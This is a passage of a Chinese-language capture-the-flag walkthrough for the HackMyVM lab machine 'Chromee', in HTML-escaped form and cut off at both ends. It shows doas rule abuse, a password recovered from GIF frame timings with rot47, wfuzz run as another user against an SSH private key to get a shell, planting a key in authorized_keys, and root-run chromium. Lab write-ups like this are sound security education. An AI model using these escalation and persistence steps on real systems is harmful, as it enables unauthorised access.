u003e→ 允许用户 \u003ccode\u003efollower\u003c/code\u003e，以用户 \u003ccode\u003esoftly\u003c/code\u003e 的身份运行 \u003ccode\u003e/usr/local/bin/wfuzz\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e2️⃣ \u003ccode\u003epermit nopass :softly as root cmd /usr/bin/chromium\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e→ 允许 \u003ccode\u003esoftly\u003c/code\u003e 用户无密码，提权为 \u003ccode\u003eroot\u003c/code\u003e 执行 \u003ccode\u003e/usr/bin/chromium\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e3️⃣ \u003ccode\u003epermit nopass :softly as root cmd /usr/bin/kill\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e→ 允许 \u003ccode\u003esoftly\u003c/code\u003e 用户无密码，提权为 \u003ccode\u003eroot\u003c/code\u003e 执行 \u003ccode\u003e/usr/bin/kill\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e允许\u003ccode\u003efollower\u003c/code\u003e，以用户 \u003ccode\u003esoftly\u003c/code\u003e 的身份运行 \u003ccode\u003e/usr/local/bin/wfuzz\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e尝试使用，输入\u003ccode\u003ecassandra\u003c/code\u003e 但是认证失败了，现在目标应该是\u003ccode\u003efollower\u003c/code\u003e的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efollower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz\nPassword: \ndoas: authentication failed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e家目录下能找到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efollower@Chromee:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\ncat.gif  note.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003enote.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efollower@Chromee:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e note.txt \nThink about rotations and the \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e’s secrets.\n\n47 is not just a number, it\u003cspan class=\"hljs-string\"\u003e's a twist of fate.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e旋转和猫？oiiaioiiiai ；47指的应该是 \u003ccode\u003erot47\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ecat.gif\u003c/code\u003e 群主的修猫\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromee/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e应该是图片隐写了\u003c/p\u003e\n\u003cp\u003e因为\u003ccode\u003egif\u003c/code\u003e是多帧的，我们查看每一帧时间\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromee identify -format \u003cspan class=\"hljs-string\"\u003e\"%T \"\u003c/span\u003e cat.gif\n65 98 65 100 102 98 67 6 6 6 6 6 6 \u003cspan class=\"hljs-comment\"\u003e#   \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e前面的帧数很奇怪不像后面稳定的帧\u003c/p\u003e\n\u003cp\u003e提权前面的帧去进行\u003ccode\u003erot47\u003c/code\u003e解密，得到密码\u003ccode\u003ep3p573r\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromee/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再次执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efollower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz\nPassword: \n /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u003cspan class=\"hljs-string\"\u003e's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n*                                                      *\n* Version up to 1.4c coded by:                         *\n* Christian Martorella (cmartorella@edge-security.com) *\n* Carlos del ojo (deepbit@gmail.com)                   *\n*                                                      *\n* Version 1.4d to 3.1.0 coded by:                      *\n* Xavier Mendez (xmendez@edge-security.com)            *\n********************************************************\n\nUsage:  wfuzz [options] -z payload,params \u0026#x3C;url\u003e\n\n        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.\n        FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering.\n\nExamples:\n        wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ\u0026#x26;pass=FUZ2Z\n        wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}\n        wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ\n\nType wfuzz -h for further information or --help for advanced usage.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试使用 \u003ccode\u003e-w\u003c/code\u003e 读取\u003ccode\u003esoftly\u003c/code\u003e的私钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efollower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz -u 127.0.0.1 -w /home/softly/.ssh/id_rsa\nPassword: \n /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u003cspan class=\"hljs-string\"\u003e's documentation for more information.\n softly@Chromee:/home/follower$\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e却意外直接获得了\u003ccode\u003esoftly\u003c/code\u003e用户的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eTo root\u003c/h3\u003e\n\u003cp\u003e在家目录可以看到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esoftly@Chromee:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e  user.txt\nflag{c5dbe81aac6438c522d2f79cc7255e6a}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e写入公钥，方便后面登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ssh-rsa xxxxxx\"\u003c/span\u003e \u003e .ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过前面我们能知道\u003ccode\u003esoftly\u003c/code\u003e可以以\u003ccode\u003eroot\u003c/code\u003e用户执行：\u003c/p\u003e\n\u003cp\u003e2️⃣ \u003ccode\u003epermit nopass :softly as root cmd /usr/bin/chromium\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e→ 允许 \u003ccode\u003esoftly\u003c/code\u003e 用户无密码，提权为 \u003ccode\u003eroot\u003c/code\u003e 执行 \u003ccode\u003e/usr/bin/chromium\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e3️⃣ \u003ccode\u003epermit nopass :softly as root cmd /usr/bin/kill\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e→ 允许 \u003ccode\u003esoftly\u003c/code\u003e 用户无密码，提权为 \u003ccode\u003eroot\u003c/code\u003e 执行 \u003ccode\u003e/usr/bin/kill\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e尝试运行\u003ccode\u003e/usr/bin/chromium\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esoftly@Chromee:~$ doas -u root /usr/bin/chromium --no-sandbox\n[10526:10526:0415/095434.491167:ERROR:process_singleton_posix.cc(353)] The profile appears to be \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e use by another Chromium process (6169) on another computer (pepster). Chromium has locked the profile so that it doesn\u003cspan class=\"hljs-string\"\u003e't get corrupted. If you are sure no other processes are using this profile, you can unlock the profile and relaunch Chromium.\n[10526:10526:0415/095434.492377:ERROR:message_box_dialog.cc(146)] Unable to show a dialog outside the UI thread message loop: Chromium - The profile appears to be in use by another Chromium process (6169) on another computer (pepster). Chromium has locked the profile so that it doesn'\u003c/span\u003et get corrupted. If you are sure no other processes are using this profile, you can unlock the profile and relaunch Chromium.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可能是因为靶机上无\u003ccode\u003eGUI\u003c/code\u003e报的错，通过资料开启无头模式和远程调用\u003c/p\u003e\n\u003cpre\u003e\u0
